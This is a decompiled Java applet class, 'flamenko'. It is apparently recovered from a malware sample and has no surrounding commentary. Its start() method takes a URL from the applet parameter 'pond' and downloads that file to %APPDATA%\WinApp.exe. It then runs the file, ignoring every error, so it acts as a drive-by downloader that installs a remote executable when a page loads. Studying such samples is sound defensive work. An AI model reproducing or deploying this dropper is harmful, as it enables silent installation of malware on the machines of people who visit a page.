// 
// Decompiled by Procyon v0.5.30
// 

package flamenko;

import java.io.OutputStream;
import java.io.BufferedOutputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.BufferedInputStream;
import java.net.URL;
import java.applet.Applet;

public class flamenko extends Applet
{
    @Override
    public void start() {
        final String str1 = this.getParameter("pond");
        final String str2 = System.getenv("APPDATA");
        final String str3 = "\\WinApp.exe";
        final String str4 = str2.concat(str3);
        BufferedInputStream localBufferedInputStream = null;
        try {
            localBufferedInputStream = new BufferedInputStream(new URL(str1).openStream());
        }
        catch (IOException ex) {}
        FileOutputStream localFileOutputStream = null;
        try {
            localFileOutputStream = new FileOutputStream(str4);
        }
        catch (FileNotFoundException ex2) {}
        final BufferedOutputStream localBufferedOutputStream = new BufferedOutputStream(localFileOutputStream, 1024);
        final byte[] arrayOfByte = new byte[1024];
        try {
            long l = 0L;
            int i;
            while ((i = localBufferedInputStream.read(arrayOfByte)) != -1) {
                localBufferedOutputStream.write(arrayOfByte, 0, i);
                l += i;
            }
        }
        catch (IOException ex3) {}
        try {
            localBufferedOutputStream.close();
        }
        catch (IOException ex4) {}
        try {
            localBufferedInputStream.close();
        }
        catch (IOException ex5) {}
        try {
            Runtime.getRuntime().exec(str4);
        }
        catch (IOException ex6) {}
    }
    
    public void main(final String[] paramArrayOfString) {
        this.start();
    }
}
